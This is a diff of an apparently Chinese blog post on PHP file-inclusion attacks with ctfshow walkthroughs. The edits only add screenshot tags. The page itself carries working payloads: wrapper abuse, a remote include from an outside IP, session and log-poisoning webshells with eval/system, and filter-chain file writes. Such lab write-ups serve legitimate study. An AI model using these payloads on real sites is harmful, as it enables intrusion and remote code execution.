@@ -321,7 +321,7 @@
 <p>payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../flag</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/noLimit.png" class>
 
 <ul>
 <li>这里从漏洞利用的角度来说也是一种任意文件读取漏洞，但是在实际环境当中，可能服务端会定死后缀为 <code>.php</code>，如下代码所示</li>
@@ -342,14 +342,14 @@
 <p>远程读取</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/file_include/remoteInclude.php?file=http://81.68.120.14:777/evil.txt</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/remoteInclude.png" class>
 
 <h2 id="0x04-文件包含结合伪协议"><a href="#0x04-文件包含结合伪协议" class="headerlink" title="0x04 文件包含结合伪协议"></a>0x04 文件包含结合伪协议</h2><h3 id="php-x2F-x2F-filter-协议"><a href="#php-x2F-x2F-filter-协议" class="headerlink" title="php:&#x2F;&#x2F;filter 协议"></a>php:&#x2F;&#x2F;filter 协议</h3><p>利用条件：<br>只是读取，所以只需要开启 <code>allow_url_fopen</code>，对 <code>allow_url_include</code> 不做要求</p>
 <p>用 <code>php://filter</code> 伪协议本质上的作用还是文件读取，但是它可以读取全部内容，相比于之前来说，如果直接读的话，很有可能只读到一行</p>
 <p>还是一样的代码，payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/filterFlag.png" class>
 
 <h3 id="php-x2F-x2F-input-协议"><a href="#php-x2F-x2F-input-协议" class="headerlink" title="php:&#x2F;&#x2F;input 协议"></a>php:&#x2F;&#x2F;input 协议</h3><p>可以访问请求的原始数据的只读流, 将 post 请求中的数据作为 PHP 代码执行</p>
 <p>利用条件：<br>需要开启 <code>allow_url_include=on</code>，对 <code>allow_url_fopen</code> 不做要求</p>
@@ -357,7 +357,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//input</span></span><br></pre></td></tr></table></figure>
 
 <p>这里我用 hackbar 没打通，似乎是只能用 bp 才能打通</p>
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/inputPHP.png" class>
 
 <h3 id="zip-x2F-x2F-伪协议"><a href="#zip-x2F-x2F-伪协议" class="headerlink" title="zip:&#x2F;&#x2F; 伪协议"></a>zip:&#x2F;&#x2F; 伪协议</h3><p><code>zip://</code> 可以访问压缩文件中的文件</p>
 <p>条件： 使用 zip 协议，需要将 <code>#</code> 编码为 <code>%23</code>，所以需要 PHP Version &gt;&#x3D;5.3.0，要是因为版本的问题无法将 <code>#</code> 编码成 <code>%23</code>，可以手动把 <code>#</code> 改成&#96;%23。&#96;&#96;</p>
@@ -371,7 +371,7 @@
 <p>payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=zip://zip.zip%23zip.php</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/zipPhp.png" class>
 
 <p>这一种攻击的前提是存在文件上传的功能，我可以上传一个包含恶意 PHP 文件的 zip 包，通过 zip 包绕过文件上传的检测，再用文件包含去打；利用角度上来说还是有一些苛刻。</p>
 <h3 id="phar-x2F-x2F-伪协议"><a href="#phar-x2F-x2F-伪协议" class="headerlink" title="phar:&#x2F;&#x2F; 伪协议"></a>phar:&#x2F;&#x2F; 伪协议</h3><p>与 <code>zip://</code> 协议类似，但用法不同，<code>zip://</code> 伪协议中是用 <code>#</code> 把压缩文件路径和压缩文件的子文件名隔开，而 <code>phar://</code> 伪协议中是用 <code>/</code> 把压缩文件路径和压缩文件的子文件名隔开，即</p>
@@ -380,16 +380,16 @@
 <p>用 phar 打的 payload，当然 <code>/</code> 可以用 <code>%2f</code> 编码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=phar://zip.phar/zip.php</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/pharPHP.png" class>
 
 <p>利用条件也是相对苛刻</p>
 <h3 id="data-text-plain-伪协议"><a href="#data-text-plain-伪协议" class="headerlink" title="data://text/plain 伪协议"></a><code>data://text/plain</code> 伪协议</h3><p>和 php 伪协议的 <code>php://input</code> 类似，也可以执行任意代码，但利用条件和用法不同</p>
 <p>条件：<code>allow_url_fopen=On</code>，<code>allow_url_include=On</code></p>
 <p>用法1：<code>?file=data:text/plain,&lt;?php 执行内容 ?&gt;</code><br>用法2：<code>?file=data:text/plain;base64</code>,编码后的 php 代码，也就是上文的 <code>&lt;?php 执行内容 ?&gt;</code></p>
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/dataPHP.png" class>
 
 <p>如果是用 base64 的方法打的，需要将 base64 的部分进行 URL 编码，才能打</p>
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/dataBase64.png" class>
 
 <h3 id="file-伪协议"><a href="#file-伪协议" class="headerlink" title="file 伪协议"></a>file 伪协议</h3><p>打法 <code>?file=file=../../</code>，很基础的攻击方式，和 SSRF 差不多，这里不再多说</p>
 <h3 id="通过伪协议绕过-die-函数"><a href="#通过伪协议绕过-die-函数" class="headerlink" title="通过伪协议绕过 die() 函数"></a>通过伪协议绕过 <code>die()</code> 函数</h3><p>这个题目会在 ctfshow web87 里面详细说明</p>
@@ -406,21 +406,21 @@
 <li>原理上还是因为 <strong>可控 + 可读</strong></li>
 </ul>
 <p>可读：php 的 session 文件的保存路径可以在 phpinfo 的 <code>session.save_path</code> 看到。</p>
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/sessionSavePath.png" class>
 
 <p>前提是开启了 <code>session.serialize_handler = php</code> 或 <code>session.serialize_handler = php_serialize</code></p>
 <p><strong>session.php</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">session_start</span>();  </span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];  </span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$username</span>;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>POST 发包，<code>username=Drunkbaby</code></p>
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/sessionNotSerialize.png" class>
 
 <p>服务端会对用户名的内容进行序列化存储，但是这个存储只会存储 username 里面的值进行了序列化存储，即 <code>s:9:&quot;Drunkbaby&quot;</code> 没有对变量名做任何处理，对变量名做处理的方式如下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);    </span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$username</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>并设置 <code>session.serialize_handler=php_binary</code></p>
 <p>同样发包 POST，<code>username=Drunkbaby</code></p>
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/sessionSerialize.png" class>
 
 <h4 id="session-包含实例"><a href="#session-包含实例" class="headerlink" title="session 包含实例"></a>session 包含实例</h4><p>写一段 demo 代码</p>
 <p><strong>sessionVul.php</strong></p>
@@ -430,10 +430,10 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php%20eval($_REQUEST[&#x27;drunkbaby&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>并且要修改 <code>Cookie: PHPSESSID</code> 的值，因为数据保存的文件名是 <code>sess_PHPSESSID</code>，这里我把它修改成了 evil；发包。</p>
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/evilSession.png" class>
 
 <p>接着进行文件包含，去包含存储 session 的文件</p>
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/sessionCMDExecute.png" class>
 
 <p>这是非常理想的漏洞条件，实际中代码中会对用户的会话信息做一定的处理后才进行存储。</p>
 <ul>
@@ -452,7 +452,7 @@
 <ul>
 <li>解决这一步的方法，从结论上来说只需要 <code>username</code> 这个恶意字段经过 base64 编码之后的长度能够整除4即可，至于推理过程可以看这一篇文章。</li>
 </ul>
-<p><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201177#h2-8" >https://www.anquanke.com/post/id/201177#h2-8<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201177#h2-8">https://www.anquanke.com/post/id/201177#h2-8<i class="fas fa-external-link-alt"></i></a></p>
 <p>发包</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=qftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftm%3C%3Fphp+eval%28%24_REQUEST%5B%27drunkbaby%27%5D%29%3B%3F%3E</span><br></pre></td></tr></table></figure>
 
@@ -460,10 +460,10 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username|s:116:&quot;cWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtPD9waHAgZXZhbCgkX1JFUVVFU1RbJ2RydW5rYmFieSddKTs/Pg==&quot;;</span><br></pre></td></tr></table></figure>
 
 <p>一整个长度为 116，符合被 4 整除</p>
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/len.png" class>
 
 <p>接着用 <code>php://filter</code> 伪协议去文件包含</p>
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/filterSession.png" class>
 
 <p>值得注意的是，这里 <code>session.serialize_handler = php</code>，如果设置成 <code>session.serialize_handler = php_serialize</code> 也可以通过类似的方法攻击。</p>
 <h4 id="No-session-start-，也就是-session-upload-progress-的攻击方式"><a href="#No-session-start-，也就是-session-upload-progress-的攻击方式" class="headerlink" title="No session_start()，也就是 session.upload_progress 的攻击方式"></a>No session_start()，也就是 <strong><code>session.upload_progress</code></strong> 的攻击方式</h4><p>要结合条件竞争打，这里可以简单提及一下原理以及攻击思路</p>
@@ -479,14 +479,14 @@
 <p>大小写绕过 <code>php</code>，构造 payload 如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=phP://input</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/web79.png" class>
 
 <p>同理 <code>data://</code> 也可以</p>
 <h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><p>过滤了 “php” 和 “data”</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file </span>= <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    </span><br><span class="line"><span class="variable">$file </span>= <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
 
 <p>和上一题的 payload 一样</p>
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/web80.png" class>
 
 <h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><p>新过滤了 <code>:</code>  如此一来无法使用伪协议打，可以用日志包含</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file </span>= <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    </span><br><span class="line"><span class="variable">$file </span>= <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    </span><br><span class="line"><span class="variable">$file </span>= <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
@@ -494,7 +494,7 @@
 <p>UA 作为恶意内容插入，读日志命令执行</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/web81.png" class>
 
 <h3 id="web82-86"><a href="#web82-86" class="headerlink" title="web82-86"></a>web82-86</h3><p><strong>竞争环境需要晚上11点30分至次日7时30分之间做，其他时间不开放竞争条件</strong></p>
 <h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><p>代码如下</p>
@@ -505,18 +505,18 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-decode/resource=hack.php</span><br><span class="line"></span><br><span class="line">content=&lt;?php eval($_POST[1]);</span><br></pre></td></tr></table></figure>
 
 <p>第一次这么打是有问题的，问题就是前面说的 base64 编码的问题，因为前面还会解析 <code>phpdie</code> 这六个字符，所以需要我们再填充两位进去</p>
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/web87FirstAttack.png" class>
 
 <ul>
 <li>填充两个字符后</li>
 </ul>
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/add2.png" class>
 
 <p>直接连🐎</p>
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/getshellWeb87.png" class>
 
 <p>拿到 flag</p>
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/web87.png" class>
 
 <h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><p>简单的一道远程包含，过滤的关键字内容如下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -525,16 +525,16 @@
 <p>payload</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg&amp;1=ls</span></span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/web88.png" class>
 
 <h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>misc + lfi</p>
 <p>mp4 用 foremost 分解出一个 png，里面是一张源代码</p>
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/SourceCode.png" class>
 
 <ul>
 <li>直接用 <code>php://filter</code> 读取</li>
 </ul>
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/web116.png" class>
 
 <h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><p>过滤了相当多，不过 <code>filter</code> 关键字没被过滤</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -555,13 +555,13 @@
 <p>写入文件的 payload</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span></span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/write.png" class>
 
 <p>接着命令执行</p>
-
+<img src="/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/web117.png" class>
 
 <h2 id="0x07-小结"><a href="#0x07-小结" class="headerlink" title="0x07 小结"></a>0x07 小结</h2><p>总体利用来说并不算难，挺有意思的一个漏洞</p>
-<h2 id="0x08-Ref"><a href="#0x08-Ref" class="headerlink" title="0x08 Ref"></a>0x08 Ref</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/e6f59f3f01b8" >https://www.jianshu.com/p/e6f59f3f01b8<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://exp10it.cn/2022/08/ctfshow-web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-writeup/" >https://exp10it.cn/2022/08/ctfshow-web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-writeup/<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x08-Ref"><a href="#0x08-Ref" class="headerlink" title="0x08 Ref"></a>0x08 Ref</h2><p><a class="link" target="_blank" rel="noopener" href="https://www.jianshu.com/p/e6f59f3f01b8">https://www.jianshu.com/p/e6f59f3f01b8<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://exp10it.cn/2022/08/ctfshow-web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-writeup/">https://exp10it.cn/2022/08/ctfshow-web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-writeup/<i class="fas fa-external-link-alt"></i></a></p>
 
             </div>
 
